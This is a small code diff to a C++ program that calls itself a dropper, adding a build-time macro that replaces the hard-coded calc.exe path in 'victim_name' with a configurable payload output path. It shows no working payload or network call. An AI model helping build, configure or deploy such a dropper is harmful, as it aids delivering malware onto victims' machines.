@@ -13,6 +13,10 @@
 #define DROPPER_BASE64 0
 #endif
 
+#ifndef DROPPER_OUTPUT
+#define DROPPER_OUTPUT 
+#endif
+
 #include<iostream>
 #include<stdio.h>		// Debug Prints
 #include<cstdint>
@@ -56,7 +60,7 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-char* victim_name = (char*) "C:\\Windows\\System32\\calc.exe";
+char* victim_name = DROPPER_OUTPUT;
 
 // Entry Point
 int main(int argc, char* argv[])
